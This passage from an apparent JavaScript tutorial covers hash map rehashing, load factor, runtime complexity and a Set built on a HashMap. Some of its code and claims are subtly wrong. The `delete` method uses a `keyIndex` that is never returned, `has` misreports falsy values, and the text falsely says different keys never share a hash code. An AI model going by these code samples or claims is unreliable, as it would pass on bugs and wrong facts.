<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hashMapSize100 = <span class="keyword">new</span> DecentHashMap(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">hashMapSize100.set(<span class="string">'cat'</span>, <span class="number">2</span>);</span><br><span class="line">hashMapSize100.set(<span class="string">'rat'</span>, <span class="number">7</span>);</span><br><span class="line">hashMapSize100.set(<span class="string">'dog'</span>, <span class="number">1</span>);</span><br><span class="line">hashMapSize100.set(<span class="string">'art'</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'collisions: '</span>, hashMapSize100.collisions); <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hashMapSize100\n'</span>, hashMapSize100.buckets);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            &lt;5 empty items&gt;,</span></span><br><span class="line"><span class="comment">  bucket#5: [ &#123; key: 'rat', value: 7 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;1 empty item&gt;,</span></span><br><span class="line"><span class="comment">  bucket#7: [ &#123; key: 'dog', value: 1 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;32 empty items&gt;,</span></span><br><span class="line"><span class="comment">  bucket#41: [ &#123; key: 'art', value: 8 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;49 empty items&gt;,</span></span><br><span class="line"><span class="comment">  bucket#90: [ &#123; key: 'cat', value: 2 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;9 empty items&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>Yay! üéä no collision!</p>
<p>Having a bigger bucket size is excellent to avoid collisions but consumes <strong>too much memory</strong>, and probably most of the buckets will be unused.</p>
<p>Wouldn‚Äôt it be great, if we can have a HashMap that automatically increases its size as needed? Well, that‚Äôs called <strong>rehash</strong>, and we are going to do it next!</p>
<h2 id="Optimal-HashMap-Implementation">Optimal HashMap Implementation<a href="#Optimal-HashMap-Implementation" class="headerlink" title="Optimal HashMap Implementation"></a></h2><p>If we have a big enough bucket we won‚Äôt have collisions thus the search time would be <em><code>O(1)</code></em>. However, how do we know how big a hash map capacity should big? 100? 1,000? A million?</p>
<p>Having allocated massive amounts of memory is impractical. So, what we can do is to have the hash map automatically resize itself based on a load factor. This operation is called <strong>Rehash</strong>.</p>
<p>The <strong>load factor</strong> is the measurement of how full is a hash map. We can get the load factor by dividing the number of items by the bucket size.</p>
<p>This will be our latest and greated hash map implementation:</p>
<!-- http://www.dcs.gla.ac.uk/~jsinger/pdfs/sicsa_openjdk/OpenJDKArchitecture.pdf -->
<!-- JDK10: https://github.com/dmlloyd/openjdk/blob/jdk/jdk/src/hotspot/share/utilities/hashtable.cpp -->
<!-- https://github.com/dmlloyd/openjdk/blob/jdk/jdk/src/java.desktop/windows/native/libawt/windows/Hashtable.h -->
<!-- https://github.com/dmlloyd/openjdk/blob/jdk/jdk/src/java.desktop/windows/native/libawt/windows/Hashtable.cpp -->
<!-- http://hg.openjdk.java.net/jdk10/master/file/6a0c42c40cd1/src/hotspot/share/utilities/hashtable.hpp -->
<!-- http://hg.openjdk.java.net/jdk10/master/file/6a0c42c40cd1/src/hotspot/share/utilities/hashtable.cpp -->
<!-- http://hg.openjdk.java.net/jdk9/jdk9/jdk/file/f08705540498/src/java.base/share/classes/java/util/HashMap.java -->
<!-- http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/556b17038b5c/src/share/classes/java/util/HashMap.java -->
<!-- http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/556b17038b5c/src/share/classes/java/util/Hashtable.java -->
<!-- http://www.docjar.com/html/api/java/util/LinkedList.java.html -->
<!-- http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/tip/src/share/classes/java/util/LinkedList.java -->
<!-- https://algs4.cs.princeton.edu/13stacks/DoublyLinkedList.java.html -->
<p><a id="HashMapWithRehash"></a></p>
<details>
 <summary><strong>Optimized Hash Map Implementation <em>(click here to show the code)</em></strong></summary>

<figure class="highlight js"><figcaption><span>Optimal HashMap Implementation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/hash-maps/hash-map.js" target="_blank" rel="noopener">documented code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HashMap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(initialCapacity = 16, loadFactor = 0.75) &#123;</span><br><span class="line">    <span class="keyword">this</span>.buckets = <span class="keyword">new</span> <span class="built_in">Array</span>(initialCapacity);</span><br><span class="line marked">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.collisions = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.keys = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hash(key) &#123;</span><br><span class="line">    <span class="keyword">let</span> hashValue = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> stringTypeKey = <span class="string">`<span class="subst">$&#123;key&#125;</span><span class="subst">$&#123;<span class="keyword">typeof</span> key&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; stringTypeKey.length; index++) &#123;</span><br><span class="line">      <span class="keyword">const</span> charCode = stringTypeKey.charCodeAt(index);</span><br><span class="line">      hashValue += charCode &lt;&lt; (index * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _getBucketIndex(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> hashValue = <span class="keyword">this</span>.hash(key);</span><br><span class="line">    <span class="keyword">const</span> bucketIndex = hashValue % <span class="keyword">this</span>.buckets.length;</span><br><span class="line">    <span class="keyword">return</span> bucketIndex;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set(key, value) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;bucketIndex, entryIndex&#125; = <span class="keyword">this</span>._getIndexes(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(entryIndex === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="comment">// initialize array and save key/value</span></span><br><span class="line">      <span class="keyword">const</span> keyIndex = <span class="keyword">this</span>.keys.push(&#123;<span class="attr">content</span>: key&#125;) - <span class="number">1</span>; <span class="comment">// keep track of the key index</span></span><br><span class="line">      <span class="keyword">this</span>.buckets[bucketIndex] = <span class="keyword">this</span>.buckets[bucketIndex] || [];</span><br><span class="line">      <span class="keyword">this</span>.buckets[bucketIndex].push(&#123;key, value, keyIndex&#125;);</span><br><span class="line">      <span class="keyword">this</span>.size++;</span><br><span class="line">      <span class="comment">// Optional: keep count of collisions</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.buckets[bucketIndex].length &gt; <span class="number">1</span>) &#123; <span class="keyword">this</span>.collisions++; &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// override existing value</span></span><br><span class="line">      <span class="keyword">this</span>.buckets[bucketIndex][entryIndex].value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if a rehash is due</span></span><br><span class="line marked">    <span class="keyword">if</span>(<span class="keyword">this</span>.loadFactor &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.getLoadFactor() &gt; <span class="keyword">this</span>.loadFactor) &#123;</span><br><span class="line marked">      <span class="keyword">this</span>.rehash(<span class="keyword">this</span>.buckets.length * <span class="number">2</span>);</span><br><span class="line marked">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;bucketIndex, entryIndex&#125; = <span class="keyword">this</span>._getIndexes(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(entryIndex === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.buckets[bucketIndex][entryIndex].value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  has(key) &#123;</span><br><span class="line">    <span class="keyword">return</span> !!<span class="keyword">this</span>.get(key);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _getIndexes(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> bucketIndex = <span class="keyword">this</span>._getBucketIndex(key);</span><br><span class="line">    <span class="keyword">const</span> values = <span class="keyword">this</span>.buckets[bucketIndex] || [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> entryIndex = <span class="number">0</span>; entryIndex &lt; values.length; entryIndex++) &#123;</span><br><span class="line">      <span class="keyword">const</span> entry = values[entryIndex];</span><br><span class="line">      <span class="keyword">if</span>(entry.key === key) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;bucketIndex, entryIndex&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;bucketIndex&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span>(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;bucketIndex, entryIndex, keyIndex&#125; = <span class="keyword">this</span>._getIndexes(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(entryIndex === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.buckets[bucketIndex].splice(entryIndex, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">this</span>.keys[keyIndex];</span><br><span class="line">    <span class="keyword">this</span>.size--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line marked">  rehash(newCapacity) &#123;</span><br><span class="line marked">    <span class="keyword">const</span> newMap = <span class="keyword">new</span> HashMap(newCapacity);</span><br><span class="line marked"></span><br><span class="line marked">    <span class="keyword">this</span>.keys.forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line marked">      <span class="keyword">if</span>(key) &#123;</span><br><span class="line marked">        newMap.set(key.content, <span class="keyword">this</span>.get(key.content));</span><br><span class="line marked">      &#125;</span><br><span class="line marked">    &#125;);</span><br><span class="line marked"></span><br><span class="line marked">    <span class="comment">// update bucket</span></span><br><span class="line marked">    <span class="keyword">this</span>.buckets = newMap.buckets;</span><br><span class="line marked">    <span class="keyword">this</span>.collisions = newMap.collisions;</span><br><span class="line marked">    <span class="comment">// Optional: both `keys` has the same content except that the new one doesn't have empty spaces from deletions</span></span><br><span class="line marked">    <span class="keyword">this</span>.keys = newMap.keys;</span><br><span class="line marked">  &#125;</span><br><span class="line"></span><br><span class="line marked">  getLoadFactor() &#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.size / <span class="keyword">this</span>.buckets.length;</span><br><span class="line marked">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p>Pay special attention to the lines 96 to 114. That‚Äôs where the rehash magic happens. We basically create a new HashMap with doubled capacity.</p>
<p>So, <strong>testing</strong> our new implementation from above ^</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">const</span> hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">assert.equal(hashMap.getLoadFactor(), <span class="number">0</span>);</span><br><span class="line">hashMap.set(<span class="string">'songs'</span>, <span class="number">2</span>);</span><br><span class="line">hashMap.set(<span class="string">'pets'</span>, <span class="number">7</span>);</span><br><span class="line">hashMap.set(<span class="string">'tests'</span>, <span class="number">1</span>);</span><br><span class="line">hashMap.set(<span class="string">'art'</span>, <span class="number">8</span>);</span><br><span class="line">assert.equal(hashMap.getLoadFactor(), <span class="number">4</span>/<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">hashMap.set(<span class="string">'Pineapple'</span>, <span class="string">'Pen Pineapple Apple Pen'</span>);</span><br><span class="line">hashMap.set(<span class="string">'Despacito'</span>, <span class="string">'Luis Fonsi'</span>);</span><br><span class="line">hashMap.set(<span class="string">'Bailando'</span>, <span class="string">'Enrique Iglesias'</span>);</span><br><span class="line">hashMap.set(<span class="string">'Dura'</span>, <span class="string">'Daddy Yankee'</span>);</span><br><span class="line"></span><br><span class="line">hashMap.set(<span class="string">'Lean On'</span>, <span class="string">'Major Lazer'</span>);</span><br><span class="line">hashMap.set(<span class="string">'Hello'</span>, <span class="string">'Adele'</span>);</span><br><span class="line">hashMap.set(<span class="string">'All About That Bass'</span>, <span class="string">'Meghan Trainor'</span>);</span><br><span class="line">hashMap.set(<span class="string">'This Is What You Came For'</span>, <span class="string">'Calvin Harris '</span>);</span><br><span class="line"></span><br><span class="line">assert.equal(hashMap.collisions, <span class="number">2</span>);</span><br><span class="line">assert.equal(hashMap.getLoadFactor(), <span class="number">0.75</span>);</span><br><span class="line">assert.equal(hashMap.buckets.length, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">hashMap.set(<span class="string">'Wake Me Up'</span>, <span class="string">'Avicii'</span>); <span class="comment">// &lt;--- Trigger REHASH</span></span><br><span class="line"></span><br><span class="line">assert.equal(hashMap.collisions, <span class="number">0</span>);</span><br><span class="line">assert.equal(hashMap.getLoadFactor(), <span class="number">0.40625</span>);</span><br><span class="line">assert.equal(hashMap.buckets.length, <span class="number">32</span>);</span><br></pre></td></tr></table></figure>
<p>Take notice that after we add the 12th item, the load factor gets beyond 0.75, so a rehash is triggered and doubles the capacity (from 16 to 32). Also, you can see how the number of collisions improves from 2 to 0!</p>
<p>This implementation is good enough to help us figure out the runtime of common operations like insert/search/delete/edit.</p>
<p>To sum up the performance of a HashMap will be given by:</p>
<ol>
<li>The hash function that for every key produces a different output.</li>
<li>Size of the bucket to hold data.</li>
</ol>
<p>We nailed both üî®. We have a decent hash function that produces different output for different data. Two different data will never return the same code. Also, we have a rehash function that automatically grows the capacity as needed. That‚Äôs great!</p>
<h2 id="Insert-element-on-a-HashMap-runtime">Insert element on a HashMap runtime<a href="#Insert-element-on-a-HashMap-runtime" class="headerlink" title="Insert element on a HashMap runtime"></a></h2><p>Inserting an element on a HashMap requires two things: a key and a value. We could use our <a href="#DecentHashMap">DecentHashMap</a> data structure that we develop or use the built-in as follows:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">object, key, value</span>) </span>&#123;</span><br><span class="line">  object[key] = value;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> object = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(insert(hash, <span class="string">'word'</span>, <span class="number">1</span>)); <span class="comment">// =&gt; &#123; word: 1 &#125;</span></span><br></pre></td></tr></table></figure>
<p>In modern JavaScript, you can use <code>Map</code>s.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertMap</span>(<span class="params">map, key, value</span>) </span>&#123;</span><br><span class="line">  map.set(key, value);</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="built_in">console</span>.log(insertMap(map, <span class="string">'word'</span>, <span class="number">1</span>)); <span class="comment">// Map &#123; 'word' =&gt; 1 &#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>Note:</strong> We are going to use the <code>Map</code> rather than regular <code>Object</code>, since the Map‚Äôs key could be anything while on Object‚Äôs key can only be string or number. Also, <code>Map</code>s keeps the order of insertion.</p>
<p>Behind the scenes, the <code>Map.set</code> just insert elements into an array (take a look at <a href="#DecentHashMap"><code>DecentHashMap.set</code></a>). So, similar to <code>Array.push</code> we have that:</p>
<blockquote>
<p>Insert an element in HashMap runtime is <em>O(1)</em>. If rehash is needed, then it will take <em>O(n)</em></p>
</blockquote>
<p>Our implementation with <a href="#HashMapWithRehash">rehash</a> functionality will keep collisions to the minimum. The rehash operation takes <em><code>O(n)</code></em> but it doesn‚Äôt happen all the time only when is needed.</p>
<h2 id="Search-Access-an-element-on-a-HashMap-runtime">Search/Access an element on a HashMap runtime<a href="#Search-Access-an-element-on-a-HashMap-runtime" class="headerlink" title="Search/Access an element on a HashMap runtime"></a></h2><p>This is the <code>HashMap.get</code> function that we use the get the value associated to a key. Let‚Äôs evaluate the implementation from <a href="#DecentHashMap"><code>DecentHashMap.get</code></a>):</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get(key) &#123;</span><br><span class="line">  <span class="keyword">const</span> hashIndex = <span class="keyword">this</span>.getIndex(key);</span><br><span class="line marked">  <span class="keyword">const</span> values = <span class="keyword">this</span>.array[hashIndex];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; values.length; index++) &#123;</span><br><span class="line">    <span class="keyword">const</span> entry = values[index];</span><br><span class="line">    <span class="keyword">if</span>(entry.key === key) &#123;</span><br><span class="line">      <span class="keyword">return</span> entry.value</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If there‚Äôs no collision, then <code>values</code> will only have one value and the access time would be <em><code>O(1)</code></em>. But, we know there will be collisions. If the initial capacity is too small and the hash function is terrible like <a href="#NaiveHashMap">NaiveHashMap.hash</a> then most of the elements will end up in a few buckets <em><code>O(n)</code></em>.</p>
<blockquote>
<p>HashMap access operation has a runtime of <em><code>O(1)</code></em> on average and worst-case of <em><code>O(n)</code></em>.</p>
</blockquote>
<p><strong>Advanced Note:</strong> Another idea to reduce the time to get elements from <em>O(n)</em> to <em>O(log n)</em> is to use a <em>binary search tree</em> instead of an array. Actually, <a href="http://hg.openjdk.java.net/jdk9/jdk9/jdk/file/f08705540498/src/java.base/share/classes/java/util/HashMap.java#l145" target="_blank" rel="noopener">Java‚Äôs HashMap implementation</a> switches from an array to a tree when a bucket has more than <a href="http://hg.openjdk.java.net/jdk9/jdk9/jdk/file/f08705540498/src/java.base/share/classes/java/util/HashMap.java#l257" target="_blank" rel="noopener">8 elements</a>.</p>
<h2 id="Edit-Delete-element-on-a-HashMap-runtime">Edit/Delete element on a HashMap runtime<a href="#Edit-Delete-element-on-a-HashMap-runtime" class="headerlink" title="Edit/Delete element on a HashMap runtime"></a></h2><p>Editing (<code>HashMap.set</code>) and deleting (<code>HashMap.delete</code>) key/value pairs have an <strong>amortized</strong> runtime of <em><code>O(1)</code></em>. In case of many collisions, we could face an <em><code>O(n)</code></em> as a worst case. However, with our rehash operation, we can mitigate that risk.</p>
<blockquote>
<p>HashMap edit and delete operations has a runtime of <em><code>O(1)</code></em> on average and worst-case of <em><code>O(n)</code></em>.</p>
</blockquote>
<h2 id="HashMap-operations-time-complexity">HashMap operations time complexity<a href="#HashMap-operations-time-complexity" class="headerlink" title="HashMap operations time complexity"></a></h2><p>We can sum up the arrays time complexity as follows:</p>
<p><strong>HashMap Time Complexities</strong></p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Worst</th>
<th>Amortized</th>
<th>Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access/Search (<code>HashMap.get</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> is an extreme case when there are too many collisions</td>
</tr>
<tr>
<td>Insert/Edit (<code>HashMap.set</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> only happens with rehash when the Hash is 0.75 full</td>
</tr>
<tr>
<td>Delete (<code>HashMap.delete</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> is an extreme case when there are too many collisions</td>
</tr>
</tbody>
</table>
<h1 id="Sets">Sets<a href="#Sets" class="headerlink" title="Sets"></a></h1><p>Sets are very similar to arrays. The difference is that they don‚Äôt allow duplicates.</p>
<p>How can we implement a Set (array without duplicates)? Well, we could use an array and check if an element is there before inserting a new one. But the running time of checking if an element is already there is <em><code>O(n)</code></em>. Can we do better than that? We develop the <code>Map</code> that has an amortized run time of <em><code>O(1)</code></em>!</p>
<!-- The best way to learn how something works is to implement it ourselves. We are also going to explore the built-in `Set` in JavaScript. -->
<h2 id="Set-Implementation">Set Implementation<a href="#Set-Implementation" class="headerlink" title="Set Implementation"></a></h2><p>We could use the JavaScript built-in <code>Set</code>. However, if we implement it ourselves, it‚Äôs more obvious to deduct the runtimes. We are going to use the <a href="#HashMapWithRehash">optimized HashMap</a> with rehash functionality.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HashMap = <span class="built_in">require</span>(<span class="string">'../hash-maps/hash-map'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.hashMap.set(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  has(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashMap.has(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get size() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashMap.size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span>(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashMap.delete(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entries() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashMap.keys.reduce(<span class="function">(<span class="params">acc, key</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(key !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        acc.push(key.content);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> acc</span><br><span class="line">    &#125;, []);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We used <code>HashMap.set</code> to add the set elements without duplicates. We use the key as the value, and since hash maps keys are unique we are all set.</p>
<p>Checking if an element is already there can be done using the <code>hashMap.has</code> which has an amortized runtime of <em><code>O(1)</code></em>. The most operations would be an amortized constant time except for getting the <code>entries</code> which is  <em><code>O(n)</code></em>.</p>
<p>Note: The JS built-in <code>Set.has</code> has a runtime of <em>O(n)</em>, since it uses a regular list of elements and check each element at a time. You can see the <code>Set.has</code> algorithm <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-set.prototype.has" target="_blank" rel="noopener">here</a></p>
<p>Here some examples how to use it:</p>
